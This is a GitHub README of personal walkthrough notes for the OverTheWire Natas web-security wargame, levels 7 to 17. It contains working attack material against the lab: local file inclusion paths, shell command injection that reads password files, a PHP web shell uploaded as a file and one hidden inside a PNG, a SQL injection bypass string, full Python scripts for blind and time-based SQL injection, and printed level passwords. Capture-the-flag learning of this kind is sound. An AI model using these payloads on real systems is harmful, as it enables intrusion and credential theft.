# over-the-wire-natas
Did till natas7 b4 creating this repo <br>
Starting from natas7<br><br>
->Natas7<br>
used concept of local file inclusion. open source code(ctrl+U) and hint is given that pwd is in /etc/.../natas8/. observe that url of home and about contains php part.
from "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"<br> Typical proof-of-concept would be to load passwd file:
<i>http://vulnerable_host/preview.php?file=../../../../etc/passwd. </i> so just put /etc../natas8 in url instead of about. <br> <br>
->Natas8<br>
nothing in ctrl+U. going to "view sourcecode" will find php code. take the encodedSecret, convert it to ascii, reverse it, decode base64 and lesgoo!! <br><br>
->Natas9<br>
play around. type * and it gives the source code. tried ls -a. # verifies that it's working. ```| cat``` gives entire txt file. or just do http://natas9.natas.labs.overthewire.org/dictionary.txt (as proven by typing ```ls -a``` in search)<br> given at beginning of natas - all pwds are at /etc/natas_webpass/natasX. so type ```| cat /etc/natas_webpass/natas10```.<br>unrelated info: no. of "." (periods) will determine the min. word length. supports regex. type ^.......$ to get 7 letter words only<br><br>
->Natas10<br>
search ```"" cat /etc/natas_webpass/natas11```.<br><br>
->Natas11<br>
WTF. 3 things - key,cipher,plaintext - are reqd. in XOR encryption. to find key do XOR of cipher and plaintext. plaintext = ```{"showpassword":"no","bgcolor":"#ffffff"}```. copy COOKIE, b64 decode it, XOR it using plaintext as key. key will be obtained as repeated pattern. now set showpwd to yes in plaintext and do reverse to find cookie. change value of cookie and reload page.<br><br>
->Natas12<br>
```A malicious file such as a Unix shell script, a windows virus, an Excel file with a dangerous formula, or a reverse shell can be uploaded on the server in order to execute code by an administrator or webmaster later – on the victim’s machine.```<br>
just write a php file with code ```<?php
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output</pre>";
?>``` and save it with .php extension. then choose it and upload it through burpsuite using proxy. in burpsuite change the file extension in file name to .php and forward the request. open the file on the site to find pwd.<br><br>
->Natas13<br>
bit tricky. take a png file (i took a ss of 140bytes). open "hexed.it" (or any other tool u find useful). upload the png file. now, afaik, png files are recognized by IHDR and IEND tags in the hexdump. so just paste your php code after IEND. save it and follow the prev level steps now. key would be displayed after the hexdump of png file like ```�PNG  IHDR�=M�sRGB���gAMA���a pHYstt�fx!IDAT8Oc�����@`��D�Q ĀQ ĀA���hl� �IEND�B`�z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ```.<br><br>
->Natas14<br>
v simple. sql injection. write username admin. pwd as ```"or '1'='1'"```. yay!<br><br>
->Natas15<br>
itta ni aata, sry. "https://medium.com/@kawsaruddin238/overthewire-natas-level-14-level-15-411de023672c"<br><br>
->Natas16<br>
```
import requests,string
#BLIND SQL INJECTION
#$(command) - command subsitution
url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
pwd = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

ch = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
password=''
for i in range(1,34):
    for char in ch:
        uri = f"{url}?needle=$(grep -E ^{password}{char}.* /etc/natas_webpass/natas17)hackers"
#grep -i "$(grep -E ^{''.join(password)}{char}.* /etc/natas_webpass/natas17)hackers" dictionary.txt
#hackers is a unique word in dictionary. so if anything gets prepended to it through our script,
#then it shouldn't return anything, right. so just add char to password with which nothing gets printed out.     
        r = requests.get(uri, auth=(username,pwd))
        if 'hackers' not in r.text:
            #The text attribute of the response object (r)
            password += char
            print(password)
            break
        else:
            continue
#"https://mcpa.github.io/natas/wargame/web/overthewire/2015/10/01/natas16/"
```
<br><br>
->Natas17<br>
read: "https://owasp.org/www-community/attacks/Blind_SQL_Injection" time-based part. help taken.
```
import requests
import time

url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
cset = ""
for char in characters:
    payload = f'natas18" AND IF(password LIKE BINARY "%{char}%", SLEEP(15), 0) -- '
    start_time = time.time()

    response = requests.get(url, params={"username": payload}, auth=auth)

    elapsed_time = time.time() - start_time
    if elapsed_time > 15:  
        cset += char
print(f"Charset: {cset}")

password = ""
while len(password) != 32:
	for c in cset:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, 15)
		r = requests.get(url, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= 15:
			#print (t)
			password = t
			break
print("password: ",password)
```
<br>
->Natas18<br>






